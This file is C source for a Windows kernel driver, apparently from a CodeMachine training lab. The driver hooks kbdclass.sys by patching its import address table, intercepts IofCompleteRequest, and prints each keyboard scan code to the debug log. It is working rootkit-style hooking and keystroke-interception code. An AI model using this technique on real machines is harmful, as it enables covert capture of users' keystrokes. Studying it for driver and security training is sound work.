/////////////////////////////////////////////////////////////////////////////
//
// (c) Copyright 2000-2014 CodeMachine Incorporated. All rights Reserved.
// Developed by CodeMachine Incorporated. (http://www.codemachine.com)
//
/////////////////////////////////////////////////////////////////////////////

#include "ntddk.h"
#include "ntimage.h"
#include "ntddkbd.h"

#define __MODULE__  "IATHook"
#define DPF(x)      DbgPrint x

#define MODULE_NAME     "kbdclass.sys"

#define RVA_TO_VA(b,r)  (((PUCHAR)(b)) + (r))

#pragma warning(disable:4054)

VOID 
DriverUnload (
    PDRIVER_OBJECT DriverObject );

// defined in EnumerateModules.c
NTSTATUS 
GetModuleBaseByName ( 
    PCHAR ModuleName,
    PUCHAR *ModuleBase );

// defined in MemCpyWP.c
VOID MemCpyWP ( 
    PUCHAR Destination, 
    PUCHAR Source, 
    ULONG Size );

// hooked IoCompleteRequest
VOID 
HookIoCompleteRequest(
    IN PIRP  Irp,
    IN CCHAR  PriorityBoost );

// Base of module that is to be hooked
PUCHAR g_ModuleBase = NULL;

// retrieves Image Data Directory from Image Base
PIMAGE_DATA_DIRECTORY
ImageGetDataDirectory (
    PUCHAR ModuleBase ) 
{
    PIMAGE_DOS_HEADER           DosHeader;
    PIMAGE_NT_HEADERS64         NtHeader;
    PIMAGE_OPTIONAL_HEADER64    OptionalHeader;

    // store the PE MSDOS compatibility header in DosHeader
    DosHeader               = (PIMAGE_DOS_HEADER)ModuleBase;

    // store the PE NT Header in NtHeader
    NtHeader                = (PIMAGE_NT_HEADERS64)(ModuleBase + DosHeader->e_lfanew);

    // store the PE Optional Header in OptionalHeader
    OptionalHeader          = (PIMAGE_OPTIONAL_HEADER64)&NtHeader->OptionalHeader;

    // return the PE Data Directory array
    return (PIMAGE_DATA_DIRECTORY)(OptionalHeader->DataDirectory);
} // ImageGetDataDirectory()

// parses the IAT of the driver @ ModuleBase and finds the IAT entry 
// that contains the OriginalFunction and replaces it with TargetFunction
BOOLEAN
PatchImportTable ( 
    PUCHAR ModuleBase, 
    PVOID OriginalFunction, 
    PVOID TargetFunction )
{
    PIMAGE_DATA_DIRECTORY DataDirectory;
    PVOID* ImportAddressTableBase;
    ULONG ImportAddressTableSize;
    ULONG Index;

    // Step #1 : Get a pointer to the base of the data directory
    // Use ImageGetDataDirectory()
    DataDirectory = ImageGetDataDirectory(ModuleBase);

    // Step #2 : Get the base of the IAT and store it in ImportAddressTableBase (RVA_TO_VA())
    ImportAddressTableBase = (PVOID *)RVA_TO_VA(ModuleBase, DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].VirtualAddress);

    // Step #3 : Get the size of the IAT and store it in ImportAddressTableSize
    ImportAddressTableSize = DataDirectory[IMAGE_DIRECTORY_ENTRY_IAT].Size;

    // Step #4 : Search through the IAT and find the entry that contains the OriginalFunction
    // replace that IAT entry with TargetFunction and return TRUE to indicate success
    // Use MemCpyWP() from the "InlineHook" lab to write to the IAT
    for (Index = 0; Index < ImportAddressTableSize / sizeof(ULONG_PTR); ++Index)
    {
        if (ImportAddressTableBase[Index] == OriginalFunction)
        {
            MemCpyWP((PUCHAR)&ImportAddressTableBase[Index], (PUCHAR)&TargetFunction, sizeof(ULONG_PTR));
            return TRUE;
        }
    }

    // if the OriginalFunction is not found return FALSE
    return FALSE;
} // PatchImportTable()

// Hook IofCompleteRequest()
VOID 
HookIoCompleteRequest(
    IN PIRP  Irp,
    IN CCHAR  PriorityBoost )
{
    PKEYBOARD_INPUT_DATA KeyboardInputData;
    ULONG Idx;
    ULONG NumberOfKeys;

    DPF(("%s!%s Irp=%p\n", __MODULE__, __FUNCTION__, Irp ));

    if ( NT_SUCCESS ( Irp->IoStatus.Status )  ) {
        // get the number of key scan codes that have been collected
        NumberOfKeys = (ULONG)(Irp->IoStatus.Information / sizeof(KEYBOARD_INPUT_DATA));

        // get a pointer to the scan code buffer
        KeyboardInputData = (PKEYBOARD_INPUT_DATA)Irp->AssociatedIrp.SystemBuffer;

        // iterate through the scan code structures and display the scan codes
        for( Idx = 0 ; Idx < NumberOfKeys ; Idx++) {
            DPF(("%u %s [%02x] \n",
                KeyboardInputData[Idx].UnitId,
                KeyboardInputData[Idx].Flags & KEY_BREAK ? "BREAK" : "MAKE ",
                KeyboardInputData[Idx].MakeCode ));
        }
    }

    // this call will read the IAT of IATHook.sys not the hooked driver
    IoCompleteRequest ( Irp, PriorityBoost );
} // HookIoCompleteRequest()


NTSTATUS 
DriverEntry(
    PDRIVER_OBJECT  DriverObject,
    PUNICODE_STRING RegistryPath )
{
    NTSTATUS Status;

    UNREFERENCED_PARAMETER(RegistryPath);

    DPF(( "*** %s.sys Loaded ***\n", __MODULE__ ));

    DriverObject->DriverUnload = DriverUnload;

    Status = GetModuleBaseByName( MODULE_NAME, &g_ModuleBase );
    if ( ! NT_SUCCESS ( Status ) ) {
        DPF(("%s!%s GetModuleBaseByName(%s) : FAIL=%08x\n", __MODULE__, __FUNCTION__,
            MODULE_NAME, Status  ));
        return Status;
    }

    if ( g_ModuleBase == NULL ) {
        DPF(("%s!%s g_ModuleBase == NULL\n", __MODULE__, __FUNCTION__,
            MODULE_NAME ));
        return STATUS_OBJECT_NAME_NOT_FOUND;
    }

    DPF(("%s!%s %s @ %p\n", __MODULE__, __FUNCTION__,
        MODULE_NAME, g_ModuleBase  ));

    if ( PatchImportTable (
        g_ModuleBase,
        (PVOID)IofCompleteRequest,
        (PVOID)HookIoCompleteRequest ) ) {
        DPF(("%s!%s PatchImportTable(IofCompleteRequest) OK\n", __MODULE__, __FUNCTION__ ));
    } else {
        DPF(("%s!%s PatchImportTable(IofCompleteRequest) FAIL\n", __MODULE__, __FUNCTION__ ));
        return STATUS_OBJECT_NAME_NOT_FOUND;
    }

    return STATUS_SUCCESS;
} // DriverEntry()

VOID 
DriverUnload (
    PDRIVER_OBJECT DriverObject )
{
    UNREFERENCED_PARAMETER(DriverObject);

    // restore what was patched
    if ( PatchImportTable (
        g_ModuleBase,
        (PVOID)HookIoCompleteRequest,
        (PVOID)IofCompleteRequest ) ) {
        DPF(("%s!%s PatchImportTable(HookIoCompleteRequest) OK\n", __MODULE__, __FUNCTION__ ));
    } else {
        DPF(("%s!%s PatchImportTable(HookIoCompleteRequest) FAIL\n", __MODULE__, __FUNCTION__ ));
    }

    DPF(( "*** %s.sys Unloaded ***\n", __MODULE__ ));
} // DriverUnload()
